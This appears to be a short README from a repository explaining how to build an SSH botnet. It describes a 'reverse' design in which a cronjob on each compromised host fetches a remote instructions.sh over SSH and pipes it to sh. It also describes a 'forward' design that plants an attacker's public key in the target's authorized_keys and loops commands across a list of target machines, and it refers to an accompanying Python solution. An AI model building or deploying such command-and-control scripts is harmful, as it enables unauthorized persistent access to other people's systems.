# Botnets
- How would you build ssh botnet?


## Initial thoughts:
- SSH could be used in reverse and forward direction. Reverse could make sense depending on firewall and would need special hardening to prevent hack backs.
- What is the intension of the ssh net? To execute commands, to obfuscate traffic?


## Reverse: 

### Prerequisits: 
- Limit to rbash shell and no access to any other command than "cat instruction.sh" via alias.
- Place/generate private rsa key on target machine if no key exist in the profile.

Cronjob or alias with he following bash script:
```bash
ssh -i id_rsa user@hostname "cat instructions.sh" | sh
```

### Forward:
Add public ssh key to target machine ~/.ssh/authorized_keys.

Easy solution -  Public Key based szenario:
```bash
while read p; do
  ssh -i id_rsa $p "command"
done <target_machines.txt
```

This solution in python can be found in the "solution.py" file.

Install requirements:
```bash
python3 -m pip install -r requirements.txt
```